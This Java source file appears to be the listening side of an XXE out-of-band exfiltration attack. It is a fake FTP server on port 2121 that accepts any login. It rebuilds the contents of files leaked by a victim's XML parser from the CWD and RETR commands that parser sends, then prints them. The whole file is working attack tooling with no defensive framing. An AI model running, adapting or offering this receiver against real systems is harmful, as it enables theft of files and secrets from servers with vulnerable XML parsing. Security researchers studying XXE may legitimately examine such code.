package com.leadroyal.xxe.server;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.NoSuchElementException;
import java.util.Scanner;

public class LocalFtpServer {
    private static final int PORT = 2121;
    private static final String RETR = "RETR";
    private static final String CWD = "CWD";
    private static final String TYPE = "TYPE";
    private static final String JUNK1 = "EPSV";
    private static final String JUNK2 = "EPRT";
    private static final String LIST = "LIST";

    public static void main(String[] args) throws IOException {
        ServerSocket socket = new ServerSocket(PORT);
        while (true) {
            Socket client = socket.accept();
            new Thread(new Runnable() {
                @Override
                public void run() {
                    StringBuilder sb = new StringBuilder();
                    boolean startRecord = false;
                    try {
                        PrintWriter remoteSender = new PrintWriter(client.getOutputStream(), true);
                        Scanner remoteReader = new Scanner(client.getInputStream(), "UTF-8");
                        // FTP 的命令一般是 \r\n 作为一行的结束
                        remoteReader.useDelimiter("\r\n");
                        remoteSender.println("220 xxe-ftp-server");
                        while (true) {
                            String line = remoteReader.nextLine();
                            System.out.println("> " + line);
                            if (line.startsWith("USER")) {
                                remoteSender.println("331 password please - version check");
                            } else {
                                remoteSender.println("230 more data please!");
                            }
                            if (!startRecord) {
                                if (line.startsWith(TYPE))
                                    startRecord = true;
                            } else {
                                if (line.startsWith(RETR)) {
                                    sb.append('/').append(line.replace("RETR ", ""));
                                    client.setSoTimeout(3000);
                                    String tail = remoteReader.nextLine();
                                    System.out.println("> " + tail);
                                    sb.append('\n').append(tail);
                                    break;
                                } else if (line.startsWith(JUNK1) || line.startsWith(JUNK2)) {
                                    // nothing
                                } else if (line.startsWith(CWD)) {
                                    sb.append('/').append(line.replace("RETR ", "").replace("CWD ", ""));
                                } else if (line.startsWith(LIST)) {
                                    sb.append('/');
                                    break;
                                } else {
                                    sb.append('\n').append(line.replace("RETR ", ""));
                                }
                            }
                        }
                        client.close();
                    } catch (NoSuchElementException e) {
                        e.printStackTrace();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    // 为了兼容 CWD ，开头多补充了一个斜杠
                    System.out.println("=====File Content=====");
                    String fileContent;
                    fileContent = sb.substring(1);
                    System.out.println(fileContent);
                    System.out.println("=====File Content=====");
                }
            }).start();
        }
    }
}
